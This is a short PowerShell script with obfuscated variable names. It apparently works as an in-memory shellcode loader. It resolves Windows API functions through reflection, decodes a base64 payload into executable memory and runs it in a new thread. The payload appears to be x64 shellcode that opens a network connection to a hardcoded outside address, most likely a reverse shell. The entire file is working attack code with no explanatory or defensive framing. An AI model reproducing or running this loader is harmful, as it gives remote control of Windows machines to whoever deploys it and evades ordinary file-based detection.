function dK {
	Param ($rFj, $wqnY)		
	$m8GH = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $m8GH.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($m8GH.GetMethod('GetModuleHandle')).Invoke($null, @($rFj)))), $wqnY))
}

function ax {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $cnfVE,
		[Parameter(Position = 1)] [Type] $sFM19 = [Void]
	)
	
	$nf = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$nf.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $cnfVE).SetImplementationFlags('Runtime, Managed')
	$nf.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $sFM19, $cnfVE).SetImplementationFlags('Runtime, Managed')
	
	return $nf.CreateType()
}

[Byte[]]$jZR = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCACtnI6AxiEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$fHNm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dK kernel32.dll VirtualAlloc), (ax @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $jZR.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($jZR, 0, $fHNm, $jZR.length)

$mxPu = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dK kernel32.dll CreateThread), (ax @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$fHNm,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dK kernel32.dll WaitForSingleObject), (ax @([IntPtr], [Int32]))).Invoke($mxPu,0xffffffff) | Out-Null
